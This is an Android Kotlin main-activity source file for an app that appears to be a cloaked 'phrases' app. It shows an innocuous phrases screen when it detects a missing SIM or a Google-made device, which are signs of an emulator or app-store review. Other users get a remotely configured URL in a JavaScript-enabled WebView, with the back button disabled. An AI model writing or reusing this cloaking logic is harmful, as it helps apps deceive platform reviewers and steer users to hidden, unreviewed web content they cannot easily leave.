package com.example.testapplication

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import com.example.testapplication.databinding.ActivityMainBinding
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import org.json.JSONObject
import java.io.BufferedReader
import java.io.IOException


class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var path: String
    private lateinit var mSettings: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        mSettings = getSharedPreferences("setting", Context.MODE_PRIVATE)
        path = mSettings.getString("key", null).toString()
        if(path == null.toString()){
            loadFire()
        } else openWebClient(path)
    }

    private fun loadFire(){
        var getUrl: String
        var jsonString = applicationContext.assets.open("remote_config_testproject_3.json").bufferedReader().use { it.readText() }
        jsonString = JSONObject(jsonString).getString("parameters")
        jsonString = JSONObject(jsonString).getString("url")
        jsonString = JSONObject(jsonString).getString("defaultValue")
        jsonString = JSONObject(jsonString).getString("value")
        getUrl = jsonString
        //val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
        //getUrl = remoteConfig.getString("url")
        //remoteConfig.fetchAndActivate()
        if( getUrl.isEmpty() || isSimDoesntActivated() || Build.MANUFACTURER.contains("google") ||Build.MANUFACTURER.contains("Google") ){
            supportFragmentManager.beginTransaction().replace(R.id.FL, PhrasesFragment.newInstance()).commit()
        }else{
            val editor: SharedPreferences.Editor = mSettings.edit()
            editor.putString("key", getUrl)
            editor.apply()
            openWebClient(getUrl)
        }
    }

    private fun openWebClient(url: String){
        val webVW = findViewById<WebView>(R.id.webVW)
        webVW.webViewClient = WebViewClient()
        webVW.apply {
            loadUrl(url)
            settings.javaScriptEnabled = true
        }
    }

    override fun onBackPressed() {}

    private fun isSimDoesntActivated (): Boolean {
        val tm:TelephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return tm.simState == TelephonyManager.SIM_STATE_ABSENT
    }

}